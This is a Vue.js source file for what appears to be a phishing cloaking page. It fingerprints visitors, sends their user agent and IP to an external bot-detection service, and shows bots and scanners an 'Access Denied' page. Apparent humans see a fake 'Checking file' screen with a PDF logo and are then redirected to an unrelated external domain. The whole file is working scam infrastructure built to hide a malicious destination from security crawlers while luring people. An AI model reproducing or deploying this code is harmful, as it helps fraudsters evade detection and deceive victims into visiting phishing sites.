import { createApp, ref, onMounted } from 'vue';
import { detect } from 'detect-browser';
import FingerprintJS from '@fingerprintjs/fingerprintjs';
import axios from 'axios';
import './assets/style.css';

const app = createApp({
  setup() {
    const loading = ref(true);
    const isBot = ref(false);
    const isBlocked = ref(false);
    const visitorIP = ref('');

    const checkVisitorReputation = async () => {
      const browser = detect();
      const fp = await FingerprintJS.load();
      const result = await fp.get();

      try {
        // Fetch the visitor's IP
        const ipInfo = await axios.get('https://api64.ipify.org?format=json');
        visitorIP.value = ipInfo.data.ip;

        // Call your API to detect bot or blocked visitor
        const response = await axios.post('https://rail-bot-production.up.railway.app/api/detect_bot', {
          user_agent: navigator.userAgent,
          ip: visitorIP.value,
        });

        const { is_bot, details } = response.data;

        // Check if the visitor is detected as a bot or comes from a blocked ISP
        if (is_bot) {
          isBot.value = true;

          // Optional: Log the detection details
          console.log('Blocked due to bot detection:', details);
        }
      } catch (error) {
        console.error('Error during bot detection:', error);
        isBlocked.value = true; // Block access if there's an issue with the API
      }
    };

    onMounted(async () => {
      await checkVisitorReputation();

      // If not blocked or bot, proceed to the main page
      if (!isBot.value && !isBlocked.value) {
        setTimeout(() => {
          window.location.href = 'https://ht.jm-arizadiaz.es/';
        }, 3000);
      }

      loading.value = false; // Stop the loading spinner
    });

    return { loading, isBot, isBlocked };
  },

  template: `
    <div v-if="!isBot && !isBlocked">
      <div v-if="loading" class="loading-container">
        <img src="/pdf-logo.png" alt="PDF Logo" class="pdf-logo" />
        <p class="loading-text">Checking file, please wait...</p>
        <div class="spinner"></div>
      </div>
    </div>
    <div v-else class="blocked-container">
      <h1>Access Denied</h1>
      <p>Your access has been blocked due to security policies.</p>
    </div>
  `,
});

app.mount('#app');
